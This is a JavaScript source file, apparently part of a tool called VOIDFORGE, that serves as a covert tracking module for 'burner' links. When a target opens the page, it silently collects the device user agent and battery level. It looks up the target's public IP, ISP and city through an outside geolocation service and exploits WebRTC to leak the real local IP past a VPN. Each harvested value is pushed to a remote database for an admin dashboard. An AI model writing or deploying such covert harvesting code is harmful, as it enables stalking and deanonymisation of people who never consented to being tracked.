/**
 * VOIDFORGE - OSINT Engine (Infiltration & Telemetry)
 * Architecture: Stealth Background Harvesting & WebRTC Leak
 */

const OsintEngine = {
    targetId: null,
    dbRef: null,
    telemetryData: {},

    // Diinisialisasi oleh Void Protocol (Master Controller) nanti
    init: function(linkId) {
        this.targetId = linkId;
        // Mengarahkan tembakan data langsung ke node telemetri kapsul ini
        this.dbRef = window.VoidDB.ref(`burner_vault/${linkId}/telemetri`);
        this.harvestSilentData();
    },

    harvestSilentData: async function() {
        // 1. Panen Identitas Perangkat (User Agent)
        this.telemetryData.userAgent = navigator.userAgent;
        
        // 2. Panen Status Baterai (Dapat digunakan untuk Battery Panic-State nanti)
        try {
            if (navigator.getBattery) {
                const bat = await navigator.getBattery();
                this.telemetryData.battery = Math.round(bat.level * 100) + '% ' + (bat.charging ? '⚡' : '');
                
                // Pantau perubahan baterai secara real-time
                bat.addEventListener('levelchange', () => {
                    this.telemetryData.battery = Math.round(bat.level * 100) + '% ' + (bat.charging ? '⚡' : '');
                    this.pushData();
                });
            }
        } catch(e) {
            this.telemetryData.battery = "UNKNOWN";
        }

        // 3. Panen IP Publik & ISP Target
        try {
            const res = await fetch('https://ipapi.co/json/');
            const ipInfo = await res.json();
            this.telemetryData.ip = ipInfo.ip || "UNKNOWN";
            this.telemetryData.isp = ipInfo.org || "UNKNOWN";
            this.telemetryData.city = ipInfo.city || "UNKNOWN";
        } catch(e) {
            this.telemetryData.ip = "BLOCKED (PROXY/ADBLOCK)";
        }

        // Eksekusi pengiriman data awal
        this.pushData();

        // 4. Eksekusi Penetrasi Lanjutan (VPN Piercer)
        this.leakWebRTC();
    },

    // Mengeksploitasi celah WebRTC untuk mendapatkan IP Lokal asli target (meskipun pakai VPN)
    leakWebRTC: function() {
        try {
            const rtc = new RTCPeerConnection({ iceServers: [] });
            rtc.createDataChannel('');
            rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
            
            rtc.onicecandidate = (ice) => {
                if (ice && ice.candidate && ice.candidate.candidate) {
                    const myIP = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate);
                    if (myIP) {
                        this.telemetryData.webrtc_ip = myIP[1];
                        this.pushData();
                        rtc.close(); // Tutup koneksi agar tidak boros memori target
                    }
                }
            };
        } catch(e) {
            this.telemetryData.webrtc_ip = "SECURED_BY_BROWSER";
            this.pushData();
        }
    },

    // Mendorong data ke Radar Panopticon Admin
    pushData: function() {
        if(this.dbRef) {
            this.dbRef.update(this.telemetryData).catch(err => {
                console.warn("Telemetri terblokir aturan keamanan parsial.");
            });
        }
    }
};
